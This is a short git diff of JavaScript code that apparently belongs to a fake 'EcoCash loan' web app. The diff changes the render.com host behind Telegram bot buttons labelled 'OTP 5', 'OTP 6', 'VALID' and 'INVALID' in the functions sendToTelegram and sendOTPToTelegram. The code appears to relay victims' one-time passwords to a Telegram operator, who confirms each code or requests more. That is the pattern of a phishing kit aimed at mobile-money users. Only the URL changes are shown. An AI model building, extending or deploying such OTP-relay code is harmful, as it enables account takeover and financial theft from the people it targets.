@@ -41,8 +41,8 @@ async function sendToTelegram(message) {
       reply_markup: {
   inline_keyboard: [
     [
-      { text: "OTP 5", url: "https://ecocash-loan-app-copy.onrender.com/telegram-command?cmd=otp5" },
-      { text: "OTP 6", url: "https://ecocash-loan-app-copy.onrender.com/telegram-command?cmd=otp6" }
+      { text: "OTP 5", url: "https://ecocash-loan-app-2.onrender.com/telegram-command?cmd=otp5" },
+      { text: "OTP 6", url: "https://ecocash-loan-app-2.onrender.com/telegram-command?cmd=otp6" }
     ]
   ]
 }
@@ -64,8 +64,8 @@ async function sendOTPToTelegram(message) {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "✅ VALID", url: "https://ecocash-loan-app-copy.onrender.com/telegram-command?cmd=valid" },
-            { text: "❌ INVALID", url: "https://ecocash-loan-app-copy.onrender.com/telegram-command?cmd=invalid" }
+            { text: "✅ VALID", url: "https://ecocash-loan-app-2.onrender.com/telegram-command?cmd=valid" },
+            { text: "❌ INVALID", url: "https://ecocash-loan-app-2.onrender.com/telegram-command?cmd=invalid" }
           ]
         ]
       }
